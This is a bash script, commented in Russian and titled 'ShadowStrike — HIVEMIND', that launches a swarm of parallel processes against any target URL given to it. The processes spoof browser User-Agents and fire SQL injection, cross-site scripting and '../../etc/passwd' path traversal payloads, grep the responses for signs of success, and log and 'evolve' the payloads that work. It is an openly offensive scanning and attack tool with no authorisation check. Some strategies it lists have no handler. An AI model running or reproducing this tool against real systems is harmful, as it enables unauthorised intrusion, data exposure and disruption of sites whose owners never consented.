#!/bin/bash
# HIVEMIND — Коллективный разум атак
# Рой автономных агентов которые общаются и координируются

TARGET=$1
AGENTS=${2:-50}
DURATION=${3:-600}

[ -z "$TARGET" ] && echo "Usage: $0 http://target.com [agents] [duration]" && exit 1

DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
HIVE="$HOME/.shadow_hive"
mkdir -p "$HIVE/agents" "$HIVE/knowledge" "$HIVE/evolution"

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — HIVEMIND                   ║"
echo "║   Коллективный разум атак                   ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "[HIVE] Цель: $TARGET"
echo "[HIVE] Агентов: $AGENTS"
echo "[HIVE] Время: ${DURATION}s"
echo ""

# ===== ОБЩАЯ БАЗА ЗНАНИЙ =====
KNOWLEDGE="$HIVE/knowledge/shared.txt"
touch "$KNOWLEDGE"

# ===== ФУНКЦИЯ ОДНОГО АГЕНТА =====
agent() {
    local id=$1
    local target=$2
    local end_time=$3
    
    # Уникальный профиль агента
    local AGENT_DIR="$HIVE/agents/agent_$id"
    mkdir -p "$AGENT_DIR"
    
    # Случайный User-Agent
    local UA_LIST=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) Safari/605.1.15"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1) AppleWebKit/605.1.15"
        "Mozilla/5.0 (Linux; Android 14) Chrome/131.0.6778.135"
        "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101"
    )
    local UA="${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]}"
    
    # Случайная стратегия
    local STRATEGIES=("sqli" "xss" "lfi" "ssti" "nosql" "recon" "stealth")
    local STRATEGY="${STRATEGIES[$((RANDOM % ${#STRATEGIES[@]}))]}"
    
    echo "[AGENT-$id] 🐝 Родился (стратегия: $STRATEGY)"
    
    # Локальная память агента
    local MEMORY="$AGENT_DIR/memory.txt"
    
    while [ $(date +%s) -lt $end_time ]; do
        # Читаем общую базу знаний
        if [ -f "$KNOWLEDGE" ]; then
            tail -10 "$KNOWLEDGE" > "$AGENT_DIR/shared_knowledge.txt"
        fi
        
        # Выбираем действие по стратегии
        case "$STRATEGY" in
            sqli)
                # Берём пейлоад из общей базы или создаём новый
                PAYLOAD=$(shuf -n1 "$HIVE/knowledge/sqli_payloads.txt" 2>/dev/null || echo "' OR '1'='1")
                RESP=$(curl -sk --max-time 5 -A "$UA" "$target?q=$PAYLOAD" -o "$AGENT_DIR/resp.html" -w "%{http_code}" 2>/dev/null)
                ;;
            xss)
                PAYLOAD="<script>alert($id)</script>"
                RESP=$(curl -sk --max-time 5 -A "$UA" "$target?q=$PAYLOAD" -o "$AGENT_DIR/resp.html" -w "%{http_code}" 2>/dev/null)
                ;;
            lfi)
                PAYLOAD="../../etc/passwd"
                RESP=$(curl -sk --max-time 5 -A "$UA" "$target?file=$PAYLOAD" -o "$AGENT_DIR/resp.html" -w "%{http_code}" 2>/dev/null)
                ;;
            recon)
                curl -sk --max-time 5 -A "$UA" "$target" -o "$AGENT_DIR/recon.html" 2>/dev/null
                grep -oP 'href="\K[^"]+' "$AGENT_DIR/recon.html" 2>/dev/null | head -5 >> "$HIVE/knowledge/paths.txt"
                ;;
            stealth)
                # Агент-невидимка — только наблюдает
                curl -sk --max-time 5 -A "$UA" -H "Accept: text/html" "$target" -o /dev/null 2>/dev/null
                ;;
        esac
        
        # Анализируем результат
        if [ -f "$AGENT_DIR/resp.html" ]; then
            if grep -qi "error\|syntax\|root:\|49\|uid=" "$AGENT_DIR/resp.html" 2>/dev/null; then
                echo "  [AGENT-$id] 💉 УСПЕХ! $STRATEGY: $PAYLOAD (HTTP $RESP)"
                
                # Делаемся знаниями с роем
                echo "$STRATEGY|$PAYLOAD|HTTP $RESP|$(date +%s)" >> "$KNOWLEDGE"
                echo "$PAYLOAD" >> "$HIVE/knowledge/sqli_payloads.txt"
                
                # Эволюция — создаём мутацию
                MUTATION=$(echo "$PAYLOAD" | tr '[:lower:]' '[:upper:]')
                echo "$MUTATION" >> "$HIVE/knowledge/sqli_payloads.txt"
                echo "  [AGENT-$id] 🧬 Мутация: $MUTATION"
            fi
        fi
        
        # Случайная пауза
        sleep 0.$((RANDOM % 5 + 1))
    done
    
    echo "[AGENT-$id] 💀 Завершил работу"
}

# ===== ЗАПУСК РОЯ =====
echo "[HIVE] 🐝 Запускаю рой из $AGENTS агентов..."
END_TIME=$(($(date +%s) + DURATION))

for i in $(seq 1 $AGENTS); do
    agent "$i" "$TARGET" "$END_TIME" &
    echo "  🐝 Агент $i запущен"
    sleep 0.1
done

# ===== КОЛЛЕКТИВНЫЙ РАЗУМ =====
echo ""
echo "[HIVE] 🧠 Коллективный разум активен"

# Мониторинг роя
while [ $(date +%s) -lt $END_TIME ]; do
    AGENTS_ALIVE=$(jobs -r | wc -l)
    KNOWLEDGE_SIZE=$(wc -l < "$KNOWLEDGE" 2>/dev/null || echo 0)
    PATHS=$(wc -l < "$HIVE/knowledge/paths.txt" 2>/dev/null || echo 0)
    PAYLOADS=$(wc -l < "$HIVE/knowledge/sqli_payloads.txt" 2>/dev/null || echo 0)
    
    echo "  📊 Живых: $AGENTS_ALIVE | Знаний: $KNOWLEDGE_SIZE | Путей: $PATHS | Пейлоадов: $PAYLOADS"
    
    # Каждую минуту — эволюция
    if [ -f "$HIVE/knowledge/sqli_payloads.txt" ]; then
        # Скрещиваем два случайных успешных пейлоада
        P1=$(shuf -n1 "$HIVE/knowledge/sqli_payloads.txt" 2>/dev/null)
        P2=$(shuf -n1 "$HIVE/knowledge/sqli_payloads.txt" 2>/dev/null)
        if [ -n "$P1" ] && [ -n "$P2" ]; then
            OFFSPRING="${P1:0:${#P1}/2}${P2:${#P2}/2}"
            echo "$OFFSPRING" >> "$HIVE/knowledge/sqli_payloads.txt"
            echo "  🧬 НОВЫЙ ВИД: $OFFSPRING"
        fi
    fi
    
    sleep 60
done

wait

echo ""
echo "══════════════════════════════════════════════"
echo "  [HIVE] РОЙ ЗАВЕРШИЛ РАБОТУ"
echo ""
echo "  🐝 Всего агентов: $AGENTS"
echo "  🧠 Коллективных знаний: $(wc -l < "$KNOWLEDGE" 2>/dev/null)"
echo "  🧬 Эволюций: $(wc -l < "$HIVE/knowledge/sqli_payloads.txt" 2>/dev/null)"
echo "  📁 Улей: $HIVE"
echo ""
echo "  Рой жив. Знания остались."
echo "  Следующий запуск начнётся с этого опыта."
echo "══════════════════════════════════════════════"
